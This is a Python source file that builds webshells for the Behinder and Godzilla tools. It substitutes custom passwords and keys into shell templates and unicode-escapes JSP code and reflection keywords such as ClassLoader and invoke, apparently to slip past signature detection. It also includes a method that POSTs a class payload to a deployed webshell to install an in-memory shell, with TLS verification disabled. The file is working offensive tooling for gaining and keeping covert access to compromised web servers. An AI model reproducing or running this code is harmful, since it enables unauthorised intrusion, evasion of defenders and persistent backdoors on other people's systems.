import re
import hashlib
import requests


class Webshell:
    def __init__(self, path, type, tool, mode, pas, key) -> None:
        self.path = path
        self.type = type
        self.tool = tool
        self.mode = mode
        self.pas = pas
        self.key = key
        self.raw_content = None
        self.content = None

    def set_shell_raw_content(self, path):
        with open(path, "r") as f:
            self.raw_content = f.read()

    def set_shell_pass(self, **kwargs):
        pass

    def set_shell_content(self):
        self.content = self.shell_to_one_line(self.raw_content)
        if self.type == "jsp":
            self.content = self.shell_to_escaped_unicode(self.content)

    def shell_to_escaped_unicode(self, data):
        spec_char = ["<", ">", "%", "!", "@", " "]
        escaped_str = ''
        for s in data:
            if s not in spec_char:
                escaped_str += "\\u{:04x}".format(ord(s))
            else:
                escaped_str += s
        return escaped_str

    def shell_to_one_line(self, data):
        # tab -> 空格
        data = data.replace("\r", " ")
        # 换行符 -> 空格
        data = data.replace("\n", " ")
        # 多空格 -> 单空格
        data = re.sub(' +', ' ', data)
        return data

    def md5(self, data):
        return hashlib.md5(data.encode()).hexdigest()[:16]


class BehinderWebshell(Webshell):
    def __init__(self, path, type, tool, mode, pas):
        Webshell.__init__(self, path, type, tool, mode, pas, key=None)
        self.set_shell_raw_content(path)
        self.set_shell_pass(pas)
        self.set_shell_content()

    def set_shell_pass(self, pas):
        pas_md5 = self.md5(pas)
        self.raw_content = self.raw_content.replace("e45e329feb5d925b", pas_md5)  # rebeyond


class GodzillaWebshell(Webshell):
    def __init__(self, path, type, tool, mode, pas, key):
        Webshell.__init__(self, path, type, tool, mode, pas, key)
        self.set_shell_raw_content(path)
        self.set_shell_pass(pas, key)
        self.set_shell_content()

    def set_shell_pass(self, pas, key):
        key_md5 = self.md5(key)
        self.raw_content = self.raw_content.replace("\"pass\"", f"\"{pas}\"")  # pass
        self.raw_content = self.raw_content.replace("'pass'", f"\"{pas}\"")  # pass
        self.raw_content = self.raw_content.replace("3c6e0b8a9c15224a", key_md5)  # key


class DefineClassWebshell(Webshell):
    def __init__(self, path, type, tool, mode, pas, key):
        Webshell.__init__(self, path, type, tool, mode, pas, key)
        self.shell_class = None
        self.headers = None
        self.set_shell_raw_content(path)
        self.set_shell_content()

    def set_shell_content(self):
        sensitive_str = [
            "getContextClassLoader",
            "loadClass",
            "newInstance",
            "reflect",
            "ClassLoader",
            "define",
            "getConstructor",
            "setAccessible",
            "invoke"
        ]
        self.content = self.shell_to_one_line(self.raw_content)
        for s in sensitive_str:
            self.content = self.content.replace(s, self.shell_to_escaped_unicode(s))

    def install_memshell(self, webshell_url):
        res = requests.post(
            webshell_url,
            data={"data": self.shell_class},
            verify=False,
            timeout=10,
            allow_redirects=False
        )
        return res.status_code != 404
